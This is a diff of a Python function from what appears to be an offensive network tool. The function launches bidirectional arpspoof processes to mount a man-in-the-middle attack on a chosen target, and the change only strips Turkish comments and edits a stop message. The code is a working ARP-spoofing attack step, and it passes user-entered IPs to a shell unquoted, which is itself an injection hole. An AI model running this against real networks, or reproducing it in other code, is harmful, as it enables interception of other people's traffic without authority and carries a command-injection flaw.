@@ -248,12 +248,10 @@ def MITM():
     if wifi_ip == "0":
         main_menu()
     else:
-        # İlk arpspoof komutunu arka planda çalıştır
         process1 = subprocess.Popen(f"arpspoof -i eth0 -t {wifi_ip} {target_ip}", shell=True)
-        # İkinci arpspoof komutunu arka planda, IP'lerin yerini değiştirerek çalıştır
         process2 = subprocess.Popen(f"arpspoof -i eth0 -t {target_ip} {wifi_ip}", shell=True)
 
-        print("\nPress double ctrl + z to stop the attack.\n")
+        print("\nPress ctrl + z to stop the attack.\n")
         while True:
             stop_command = input().strip().lower()
             if stop_command == 'd':
